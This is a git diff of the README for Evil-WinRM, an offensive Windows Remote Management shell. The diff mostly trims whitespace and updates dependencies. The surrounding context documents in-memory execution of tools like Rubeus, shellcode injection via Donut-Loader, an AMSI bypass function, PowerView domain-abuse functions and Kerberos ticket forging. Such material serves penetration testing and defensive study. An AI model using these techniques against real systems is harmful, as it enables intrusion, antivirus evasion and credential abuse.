@@ -41,8 +41,6 @@ protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runsp
 
 ## Help
 ```
-Evil-WinRM shell v3.3
-
 Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
     -S, --ssl                        Enable ssl
     -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
@@ -66,7 +64,7 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
 ```
 
 ## Requirements
-Ruby 2.3 or higher is needed. Some ruby gems are needed as well: `winrm >=2.3.2`, `winrm-fs >=1.3.2`, `stringio >=0.0.2`.
+Ruby 2.3 or higher is needed. Some ruby gems are needed as well: `winrm >=2.3.2`, `winrm-fs >=1.3.2`, `stringio >=0.0.2`, `logger >= 1.4.3`, `fileutils >= 0.7.2`.
 Depending of your installation method (3 availables) the installation of them could be required to be done manually.
 
 Another important requirement only used for Kerberos auth is to install the Kerberos package used for network authentication.
@@ -86,7 +84,7 @@ evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ho
 ### Method 2. Git clone and install dependencies on your system manually
  - Step 1. Install dependencies manually: `sudo gem install winrm winrm-fs stringio`
  - Step 2. Clone the repo: `git clone https://github.com/Hackplayers/evil-winrm.git`
- - Step 3. Ready. Just launch it! 
+ - Step 3. Ready. Just launch it!
 ```
 cd evil-winrm && ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 ```
@@ -95,7 +93,7 @@ cd evil-winrm && ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySupe
  - Step 1. Install bundler: `gem install bundler`
  - Step 2. Clone the repo: `git clone https://github.com/Hackplayers/evil-winrm.git`
  - Step 3. Install dependencies with bundler: `cd evil-winrm && bundle install --path vendor/bundle`
- - Step 4. Launch it with bundler: 
+ - Step 4. Launch it with bundler:
 ```
 bundle exec evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 ```
@@ -127,26 +125,22 @@ To use IPv6, the address must be added to /etc/hosts. Just put the already set n
  - **menu**: load the `Invoke-Binary`, `Dll-Loader` and `Donut-Loader` functions that we will explain below. When a ps1 is loaded all its functions will be shown up.
 
 ```
-Evil-WinRM shell v3.3
-
-Info: Establishing connection to remote endpoint
-
 *Evil-WinRM* PS C:\> menu
 
-   ,.   (   .      )               "            ,.   (   .      )       .   
-  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
-.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
-_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
-\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
- |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+   ,.   (   .      )               "            ,.   (   .      )       .
+  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
  |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
 /_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
         \/                               \/          \/       \/         \/
 
           By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
 
-[+] Dll-Loader 
-[+] Donut-Loader 
+[+] Dll-Loader
+[+] Donut-Loader
 [+] Invoke-Binary
 [+] Bypass-4MSI
 [+] services
@@ -164,36 +158,36 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 *Evil-WinRM* PS C:\> PowerView.ps1
 *Evil-WinRM* PS C:\> menu
 
-   ,.   (   .      )               "            ,.   (   .      )       .   
-  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
-.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
-_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
-\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
- |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+   ,.   (   .      )               "            ,.   (   .      )       .
+  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
  |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
 /_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
         \/                               \/          \/       \/         \/
 
           By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
 
-[+] Add-DomainAltSecurityIdentity 
-[+] Add-DomainGroupMember 
-[+] Add-DomainObjectAcl 
-[+] Add-RemoteConnection 
-[+] Add-Win32Type 
-[+] Convert-ADName 
-[+] Convert-DNSRecord 
-[+] ConvertFrom-LDAPLogonHours 
-[+] ConvertFrom-SID 
-[+] ConvertFrom-UACValue 
-[+] Convert-LDAPProperty 
-[+] Convert-LogonHours 
-[+] ConvertTo-SID 
-[+] Dll-Loader 
-[+] Donut-Loader 
-[+] Export-PowerViewCSV 
-[+] field 
-[+] Find-DomainLocalGroupMember 
+[+] Add-DomainAltSecurityIdentity
+[+] Add-DomainGroupMember
+[+] Add-DomainObjectAcl
+[+] Add-RemoteConnection
+[+] Add-Win32Type
+[+] Convert-ADName
+[+] Convert-DNSRecord
+[+] ConvertFrom-LDAPLogonHours
+[+] ConvertFrom-SID
+[+] ConvertFrom-UACValue
+[+] Convert-LDAPProperty
+[+] Convert-LogonHours
+[+] ConvertTo-SID
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Export-PowerViewCSV
+[+] field
+[+] Find-DomainLocalGroupMember
 ```
 
 ### Advanced commands
@@ -209,7 +203,7 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
     Required dependencies: None
     Optional dependencies: None
 .DESCRIPTION
-    
+
 .EXAMPLE
     Invoke-Binary /opt/csharp/Watson.exe
     Invoke-Binary /opt/csharp/Binary.exe param1,param2,param3
@@ -218,16 +212,16 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
     -----------
     Function that execute binaries from memory.
 
-*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Rubeus.exe 
+*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Rubeus.exe
 
-   ______        _                      
-  (_____ \      | |                     
-   _____) )_   _| |__  _____ _   _  ___ 
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
   |  __  /| | | |  _ \| ___ | | | |/___)
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v2.0.0 
+  v2.0.0
 
 
  Ticket requests and renewals:
@@ -290,7 +284,7 @@ Architecture : x64
     Required dependencies: None
     Optional dependencies: None
 .DESCRIPTION
-    
+
 .EXAMPLE
     Donut-Loader -process_id 2195 -donutfile /home/cybervaca/donut.bin
     Donut-Loader -process_id (get-process notepad).id -donutfile /home/cybervaca/donut.bin
@@ -304,24 +298,24 @@ You can use this [donut-maker] to generate the payload.bin if you don't use Wind
 This script use a python module written by Marcello Salvati ([byt3bl33d3r]). It could be installed using pip: `pip3 install donut-shellcode`
 
 ```
-python3 donut-maker.py -i Covenant.exe      
+python3 donut-maker.py -i Covenant.exe
 
-   ___  _____    
- .'/,-Y"     "~-.  
- l.Y             ^.           
- /\               _\_      Donuts!   
-i            ___/"   "\ 
-|          /"   "\   o !   
-l         ]     o !__./   
- \ _  _    \.___./    "~\  
-  X \/ \            ___./  
- ( \ ___.   _..--~~"   ~`-.  
-  ` Z,--   /               \    
-    \__.  (   /       ______) 
-      \   l  /-----~~" /      
-       Y   \          / 
-       |    "x______.^ 
-       |           \    
+   ___  _____
+ .'/,-Y"     "~-.
+ l.Y             ^.
+ /\               _\_      Donuts!
+i            ___/"   "\
+|          /"   "\   o !
+l         ]     o !__./
+ \ _  _    \.___./    "~\
+  X \/ \            ___./
+ ( \ ___.   _..--~~"   ~`-.
+  ` Z,--   /               \
+    \__.  (   /       ______)
+      \   l  /-----~~" /
+       Y   \          /
+       |    "x______.^
+       |           \
        j            Y
 
 
@@ -351,9 +345,9 @@ This script contains malicious content and has been blocked by your antivirus so
 
  - To generate ticket there are many ways:
 
-   * Using [ticketer.py] from impacket 
+   * Using [ticketer.py] from impacket
    * If you get a kirbi ticket using [Rubeus] or [Mimikatz] you have to convert to ccache using [ticket_converter.py]
-   
+
  - Add ccache ticket. There are 2 ways:
 
     `export KRB5CCNAME=/foo/var/ticket.ccache`
